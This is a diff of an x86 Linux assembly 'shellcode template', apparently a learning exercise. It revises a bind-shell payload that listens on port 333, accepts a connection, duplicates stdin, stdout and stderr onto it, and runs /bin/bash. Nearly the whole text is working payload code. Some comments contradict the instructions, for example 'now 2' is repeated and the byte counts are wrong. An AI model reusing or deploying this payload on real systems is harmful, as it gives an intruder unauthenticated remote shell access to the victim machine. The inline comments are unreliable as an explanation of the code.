@@ -4,9 +4,6 @@
 ; Website:  http://0x14d
 ; Purpose:  Template for shellcode. 
 
-;TO DO
-;push to esp the addresses for the parameters of the syscalls. 
-
 
 global _start			
 
@@ -18,13 +15,13 @@ _start:
 
 	;Socket
 	;In reverse order, pushing each value to the stack:
-
-	push ax      ; Pushing 0 for the Protocol parameter required
+    	xor eax, eax
+	push eax      ; Pushing 0 for the Protocol parameter required
 	push 0x1     ; Pushing 1 for the Type (SOCK_STREAM) parameter required
 	push 0x2     ; Pushing 2 for the Domain (IF_INET) parameter required
 	
-	add ax, 0x66; Adding syscall for socketcall() to eax
-	add bx, 0x1  ; 0x1 is added to bx for the socketcall parameter 'socket'
+	mov eax, 0x66; Adding syscall for socketcall() to eax
+	mov ebx, 0x1  ; 0x1 is added to bx for the socketcall parameter 'socket'
 
 		     ; At this point, eax is set to 0x66 for the socketcall
 		     ; syscall, ebx is set to 0x1 for the socket parameter
@@ -45,26 +42,28 @@ _start:
 	;Bind
 	;Similar as before, but with different parameters for the bind socketcall
 
-	add eax, 0x66 ; eax contained the File Descriptor, now socketcall().
-	add bx, bx    ; Making ebx 2 for bind socketcall()	
+	mov eax, 0x66 ; eax contained the File Descriptor, now socketcall().
+	mov ebx, 0x2    ; Making ebx 2 for bind socketcall()	
 	
 
 	;Add parameters to stack to be used for ecx
 	;As stated before, these have to be put in reverse
 	; For ecx - int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
 
-	;addrlen
-	push 0x10    ; push addrlen to the stack, of the structure below. This is 16 bytes
-
 	;sockaddr structure
-	push esi     ; esi should contain 0, which is pushed to the stack for INADDR_ANY (8 bytes) 
-	push word 0x14d ; Pushing the port (333) to the stack (4 bytes)
-	push ebx     ; Pushing 2 to the stack for IF_INET (4 bytes)
-	
+	push esi     ; esi should contain 0, which is pushed to the stack for INADDR_ANY (8 bytes)
+    	push word 0x4d01 ; Pushing the port (333) to the stack (4 bytes)
+    	push word 0x2     ; Pushing 2 to the stack for IF_INET (4 bytes)
+
+	;addrlen
+	mov ecx, esp ; Moving the stack pointer to ecx to point to sockaddr structure each time
+
+	push 0x10    ; push addrlen to the stack, of the structure below. This is 16 bytes
+	push ecx     ; the stack pointer 
 	push edx     ;File Descriptor from socket call
 	
-
-	mov ecx, esp ; Moving the pointer to the stack into ecx
+	mov ecx, esp ; the previous value of ecx was pushed to the stack a few instructions before, this updates
+		     ; ecx with the current stack pointer to the values previously pushed to the stack. 
 
 	int 0x80     ; Interupt to call the syscall
 
@@ -74,8 +73,8 @@ _start:
 
 	;Listen
 
-	add eax, 0x66; Socketcall syscall
-	add ebx, 0x4 ; add 4 to ebx for listen 
+	mov eax, 0x66; Socketcall syscall
+	mov ebx, 0x4 ; add 4 to ebx for listen 
 
 	;ecx
 	;int listen(int sockfd, int backlog);
@@ -91,8 +90,8 @@ _start:
 
 	;Accept
 
-	add eax, 0x66; Socketcall syscall
-        add ebx, 0x5 ; add 5 to ebx for accept
+	mov eax, 0x66; Socketcall syscall
+    	mov ebx, 0x5 ; add 5 to ebx for accept
 
 	;ecx
 	;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
@@ -112,63 +111,41 @@ _start:
 	;dup2
 	;This could be looped
 
-	add eax, 0x3f ; Syscall for dup2
+	mov eax, 0x3f ; Syscall for dup2
 	mov ebx, edx  ; Moving the old FD into ebx
 	mov ecx, esi  ; Moving 0 into ecx for 'stdin'
 	int 0x80      ; Interupt to call the syscall
 
-        inc ecx       ; Increment ecx so it is now 2
-        int 0x80      ; Interupt to call the syscall
+	mov eax, 0x3f
+   	inc ecx       ; Increment ecx so it is now 2
+    	int 0x80      ; Interupt to call the syscall
 
+	mov eax, 0x3f
 	inc ecx       ; Increment ecx so it is now 2
-        int 0x80      ; Interupt to call the syscall
+    	int 0x80      ; Interupt to call the syscall
 	
 
 
 	;execve
 
-        xor eax, eax
-        push eax ; for edx?
+    	xor eax, eax
+    	push eax ; for edx?
 
-        ; push////bin/bash (12)
-        push 0x68736162
-        push 0x2f6e6962
-        push 0x2f2f2f2f
+   	; push////bin/bash (12)
+    	push 0x68736162
+   	push 0x2f6e6962
+    	push 0x2f2f2f2f
 
-        mov ebx, esp ; move these into ebx as required
+    	mov ebx, esp ; move these into ebx as required
 
-        push eax ; xor'd to be 0 pushed onto stack
-        mov edx, esp
+   	push eax ; xor'd to be 0 pushed onto stack
+    	mov edx, esp
 
-        push ebx
-        mov ecx, esp
+    	push ebx
+    	mov ecx, esp
 
-        mov al, 11
-        int 0x80
-
-
-
-;	mov al, 0xb   ; Putting 11 into eax for the execve syscall  
-;
-;
- ;       push esi      ; Pushing 0 to the stack for the value in edx
-;
- ;       ; push////bin/bash (12) to the stack for the address 
-  ;      push 0x68736162
-   ;     push 0x2f6e6962
-    ;    push 0x2f2f2f2f
-;
- ;       mov ebx, esp ; move these into ebx as required
-;
- ;       push esi ; xor'd to be 0 pushed onto stack
-  ;      mov edx, esp
-;
- ;       push ebx
-  ;      mov ecx, esp
-;
- ;       mov al, 11
-  ;      int 0x80
-
+    	mov eax, 11
+    	int 0x80
 
 
 
